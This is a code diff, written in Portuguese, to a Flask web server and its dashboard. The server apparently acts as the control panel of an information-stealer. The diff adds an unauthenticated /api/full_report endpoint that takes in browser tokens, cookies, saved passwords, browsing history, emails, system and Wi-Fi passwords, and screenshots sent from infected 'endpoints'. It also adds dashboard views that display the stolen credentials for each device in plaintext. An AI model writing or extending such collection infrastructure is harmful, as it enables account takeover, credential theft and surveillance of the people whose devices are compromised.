@@ -50,12 +50,16 @@ def log_request():
 # Dados em memoria
 endpoints = {}
 metrics_data = []
-endpoint_screenshots = {}
-screenshot_requests = {}
 endpoint_tokens = {}
 endpoint_cookies = {}
 endpoint_passwords = {}
 endpoint_files = {}
+endpoint_screenshots = {}
+endpoint_emails = {}
+endpoint_history = {}
+endpoint_system_passwords = {}
+endpoint_wifi_passwords = {}
+endpoint_system_info = {}
 full_reports = {}
 uploaded_files = {}
 
@@ -882,19 +886,154 @@ HTML_TEMPLATE = """
             const contentDiv = document.getElementById('deviceDataContent');
             contentDiv.innerHTML = '<div style="text-align: center; padding: 40px; color: #6b7280;">Carregando...</div>';
             
-            // Simulação - você pode implementar chamadas reais aqui
-            setTimeout(() => {
-                contentDiv.innerHTML = `
-                    <div class="data-section">
-                        <h3>${getCategoryIcon(category)} ${getCategoryName(category)}</h3>
-                        <div style="text-align: center; padding: 40px; color: #6b7280;">
-                            <p>Dados do dispositivo ${endpointId}</p>
-                            <p style="margin-top: 10px; font-size: 0.9rem;">Categoria: ${category}</p>
-                            <p style="margin-top: 20px; color: #9ca3af;">Funcionalidade em desenvolvimento...</p>
-                        </div>
-                    </div>
-                `;
-            }, 500);
+            // Mapeamento de categorias para APIs
+            const apiMap = {
+                'tokens': '/api/tokens_data',
+                'emails': '/api/emails_data', 
+                'passwords': '/api/passwords_data',
+                'cookies': '/api/cookies_data',
+                'history': '/api/history_data',
+                'wifi': '/api/wifi_data',
+                'system': '/api/system_data',
+                'files': '/api/files_data'
+            };
+            
+            const apiUrl = apiMap[category];
+            if (!apiUrl) {
+                contentDiv.innerHTML = '<div style="text-align: center; padding: 40px; color: #6b7280;">Categoria não encontrada</div>';
+                return;
+            }
+            
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    const endpointData = data[endpointId];
+                    if (!endpointData) {
+                        contentDiv.innerHTML = `<div style="text-align: center; padding: 40px; color: #6b7280;">Nenhum dado encontrado para ${endpointId}</div>`;
+                        return;
+                    }
+                    
+                    let html = `<div class="data-section"><h3>${getCategoryIcon(category)} ${getCategoryName(category)}</h3><div>`;
+                    
+                    switch(category) {
+                        case 'tokens':
+                            const tokens = endpointData.tokens || [];
+                            tokens.forEach(token => {
+                                html += `
+                                    <div class="token-card">
+                                        <strong>Token:</strong> ${token.token || 'N/A'}<br>
+                                        <strong>Válido:</strong> ${token.valid ? '✅' : '❌'}<br>
+                                        ${token.account ? `<strong>Conta:</strong> ${token.account.username || 'N/A'}<br>` : ''}
+                                    </div>
+                                `;
+                            });
+                            break;
+                            
+                        case 'emails':
+                            const emails = endpointData.emails || [];
+                            emails.forEach(email => {
+                                html += `
+                                    <div class="token-card">
+                                        <strong>Email:</strong> ${email}<br>
+                                        <strong>Fonte:</strong> Sistema<br>
+                                    </div>
+                                `;
+                            });
+                            break;
+                            
+                        case 'passwords':
+                            const passwords = endpointData.passwords || [];
+                            passwords.forEach(password => {
+                                html += `
+                                    <div class="password-card">
+                                        <strong>Serviço:</strong> ${password.target || password.service || 'N/A'}<br>
+                                        <strong>Usuário:</strong> ${password.username || 'N/A'}<br>
+                                        <strong>Senha:</strong> ${password.password || '***'}<br>
+                                        <strong>Tipo:</strong> ${password.type || 'Sistema'}<br>
+                                    </div>
+                                `;
+                            });
+                            break;
+                            
+                        case 'cookies':
+                            const cookies = endpointData.cookies || [];
+                            cookies.forEach(cookie => {
+                                html += `
+                                    <div class="cookie-card">
+                                        <strong>Nome:</strong> ${cookie.name || 'N/A'}<br>
+                                        <strong>Domínio:</strong> ${cookie.domain || cookie.host || 'N/A'}<br>
+                                        <strong>Valor:</strong> ${(cookie.value || '').substring(0, 100)}${(cookie.value || '').length > 100 ? '...' : ''}<br>
+                                    </div>
+                                `;
+                            });
+                            break;
+                            
+                        case 'history':
+                            const history = endpointData.history || [];
+                            history.forEach(item => {
+                                html += `
+                                    <div class="token-card">
+                                        <strong>Título:</strong> ${item.title || 'N/A'}<br>
+                                        <strong>URL:</strong> ${item.url || 'N/A'}<br>
+                                        <strong>Visitas:</strong> ${item.visit_count || 1}<br>
+                                    </div>
+                                `;
+                            });
+                            break;
+                            
+                        case 'wifi':
+                            const wifiPasswords = endpointData.passwords || [];
+                            wifiPasswords.forEach(wifi => {
+                                html += `
+                                    <div class="password-card">
+                                        <strong>Rede:</strong> ${wifi.ssid || 'N/A'}<br>
+                                        <strong>Senha:</strong> ${wifi.password || '***'}<br>
+                                        <strong>Tipo:</strong> ${wifi.auth || 'WPA2'}<br>
+                                    </div>
+                                `;
+                            });
+                            break;
+                            
+                        case 'system':
+                            const systemInfo = endpointData;
+                            Object.keys(systemInfo).forEach(key => {
+                                html += `
+                                    <div class="token-card">
+                                        <strong>${key}:</strong> ${systemInfo[key]}<br>
+                                    </div>
+                                `;
+                            });
+                            break;
+                            
+                        case 'files':
+                            const files = endpointData.files || [];
+                            files.forEach(file => {
+                                html += `
+                                    <div class="token-card">
+                                        <strong>Nome:</strong> ${file.name || file.filename || 'N/A'}<br>
+                                        <strong>Tamanho:</strong> ${file.size ? (file.size / 1024).toFixed(2) + ' KB' : 'N/A'}<br>
+                                        <strong>Tipo:</strong> ${file.type || file.content_type || 'N/A'}<br>
+                                    </div>
+                                `;
+                            });
+                            break;
+                    }
+                    
+                    html += '</div></div>';
+                    contentDiv.innerHTML = html;
+                    
+                    if ((endpointData.tokens?.length || 0) === 0 && 
+                        (endpointData.emails?.length || 0) === 0 && 
+                        (endpointData.passwords?.length || 0) === 0 && 
+                        (endpointData.cookies?.length || 0) === 0 && 
+                        (endpointData.history?.length || 0) === 0) {
+                        contentDiv.innerHTML = `<div style="text-align: center; padding: 40px; color: #6b7280;">Nenhum dado de ${getCategoryName(category)} encontrado para ${endpointId}</div>`;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading device data:', error);
+                    contentDiv.innerHTML = '<div style="text-align: center; padding: 40px; color: #6b7280;">Erro ao carregar dados</div>';
+                });
         }
         
         function getCategoryIcon(category) {
@@ -1776,6 +1915,110 @@ def get_cookies_data():
 def get_passwords_data():
     """Retorna todas as senhas coletadas"""
     return jsonify(endpoint_passwords)
+
+@app.route('/api/full_report', methods=['POST'])
+def receive_full_report():
+    """Recebe relatório completo do cliente"""
+    try:
+        data = request.get_json()
+        endpoint_id = data.get('endpoint_id')
+        report_data = data.get('report_data', {})
+        
+        if not endpoint_id:
+            return jsonify({'error': 'endpoint_id é obrigatório'}), 400
+        
+        # Armazenar tokens
+        if 'browser_data' in report_data:
+            browser_data = report_data['browser_data']
+            for browser_name, data in browser_data.items():
+                if 'tokens' in data and data['tokens']:
+                    if endpoint_id not in endpoint_tokens:
+                        endpoint_tokens[endpoint_id] = {'tokens': []}
+                    endpoint_tokens[endpoint_id]['tokens'].extend(data['tokens'])
+                
+                if 'cookies' in data and data['cookies']:
+                    if endpoint_id not in endpoint_cookies:
+                        endpoint_cookies[endpoint_id] = {'cookies': []}
+                    endpoint_cookies[endpoint_id]['cookies'].extend(data['cookies'])
+                
+                if 'passwords' in data and data['passwords']:
+                    if endpoint_id not in endpoint_passwords:
+                        endpoint_passwords[endpoint_id] = {'passwords': []}
+                    endpoint_passwords[endpoint_id]['passwords'].extend(data['passwords'])
+                
+                if 'history' in data and data['history']:
+                    if endpoint_id not in endpoint_history:
+                        endpoint_history[endpoint_id] = {'history': []}
+                    endpoint_history[endpoint_id]['history'].extend(data['history'])
+        
+        # Armazenar emails
+        if 'emails' in report_data and report_data['emails']:
+            if endpoint_id not in endpoint_emails:
+                endpoint_emails[endpoint_id] = {'emails': []}
+            endpoint_emails[endpoint_id]['emails'].extend(report_data['emails'])
+        
+        # Armazenar senhas do sistema
+        if 'system_passwords' in report_data and report_data['system_passwords']:
+            if endpoint_id not in endpoint_system_passwords:
+                endpoint_system_passwords[endpoint_id] = {'passwords': []}
+            endpoint_system_passwords[endpoint_id]['passwords'].extend(report_data['system_passwords'])
+        
+        # Armazenar senhas WiFi
+        if 'wifi_passwords' in report_data and report_data['wifi_passwords']:
+            if endpoint_id not in endpoint_wifi_passwords:
+                endpoint_wifi_passwords[endpoint_id] = {'passwords': []}
+            endpoint_wifi_passwords[endpoint_id]['passwords'].extend(report_data['wifi_passwords'])
+        
+        # Armazenar informações do sistema
+        if 'system_info' in report_data:
+            endpoint_system_info[endpoint_id] = report_data['system_info']
+        
+        # Armazenar screenshot
+        if 'screenshot' in report_data and report_data['screenshot']:
+            endpoint_screenshots[endpoint_id] = {
+                'image': report_data['screenshot'],
+                'timestamp': report_data.get('timestamp', datetime.now().isoformat())
+            }
+        
+        # Atualizar informações do endpoint
+        if endpoint_id in endpoints:
+            metadata = report_data.get('metadata', {})
+            endpoints[endpoint_id].update({
+                'last_seen': datetime.now().strftime('%H:%M:%S'),
+                'platform': metadata.get('platform', endpoints[endpoint_id].get('platform', 'Unknown')),
+                'ram': metadata.get('ram', endpoints[endpoint_id].get('ram', 'Unknown'))
+            })
+        
+        print(f"[API] Relatório completo recebido de {endpoint_id}")
+        return jsonify({'success': True, 'message': 'Relatório recebido com sucesso'})
+        
+    except Exception as e:
+        print(f"[API] Erro ao receber relatório completo: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/emails_data')
+@require_login
+def get_emails_data():
+    """Retorna todos os emails coletados"""
+    return jsonify(endpoint_emails)
+
+@app.route('/api/history_data')
+@require_login
+def get_history_data():
+    """Retorna todo o histórico de navegação"""
+    return jsonify(endpoint_history)
+
+@app.route('/api/wifi_data')
+@require_login
+def get_wifi_data():
+    """Retorna todas as senhas WiFi"""
+    return jsonify(endpoint_wifi_passwords)
+
+@app.route('/api/system_data')
+@require_login
+def get_system_data():
+    """Retorna informações do sistema"""
+    return jsonify(endpoint_system_info)
 
 @app.route('/api/files_data')
 @require_login
